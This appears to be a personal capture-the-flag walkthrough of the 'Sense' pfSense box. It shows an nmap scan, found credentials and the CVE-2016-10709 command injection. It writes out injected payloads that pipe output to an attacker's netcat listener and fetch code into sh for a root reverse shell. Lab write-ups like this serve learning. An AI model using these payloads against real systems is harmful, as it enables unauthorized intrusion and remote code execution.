# sense

## nmap scan


└─$ cat ../nmap/initial.nmap
# Nmap 7.93 scan initiated Sat Mar 11 19:39:35 2023 as: nmap -sC -sV -o nmap/initial.nmap 10.129.7.27
Nmap scan report for 10.129.7.27
Host is up (0.15s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.129.7.27/
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-title: Login
|_http-server-header: lighttpd/1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 11 19:40:17 2023 -- 1 IP address (1 host up) scanned in 41.27 seconds

# https

This machine has port 80 and 443 open with 80 forwarding to 443 for a secure connection. I watched a walkthrough before attempting the box, so I knew about a ban that the box had if you attempted to brute-force the login.

But with directory enumeration you're able to find 2 txt files that can be viewed without authenticating. One reveals that there was 3 vulns and 2 have been fixed. The other txt file reveals the username of the user for the box. 

rohit:pfsense

# CVE-2016-10709

The vulnerability lies in the database parameter of the status_rrd_graph_img.php file. This parameter allows for os command injection. 

```php
if(strstr($curdatabase, "queues")) {
.
.
.
    exec("/bin/rm -f $rrddbpath$curdatabase");
```

This is where the vulnerability exists. If databases is == queues, it is not sanitized and entered into a system command. All thats needed is a semi-colon ';' and we can append any command onto the end. 

# exploit

Since this exploit is not reflective I needed to connect to a nc listener to receive information.


my machine:
    nc -nvlp 6666

victim:
    **..queues;echo+test+|+nc+10.10.14.124+6666**

This payload pipes the output of the echo command into the nc connection and my machine receives "test".


To exploit this for a reverse shell I needed to pipe python reverse shell code into my listener then set up another listerner to catch the reverse shell when. And on the victim I needed to connect to the first nc listener and pipe the output or python code into sh.


my machine:
    nc -nlvp 6666 < reverse.py
    nc -nvlp 1234

victim:
    **...queues;+nc+10.10.14.124+6666+|+sh**

And I received a shell with root privileges. Similar to ippsec, I want to write a python script for learning purposes that assigns the csrf cookie dynamically and brute forces the login. Also I want to check out what is banning naive brute-forcers.


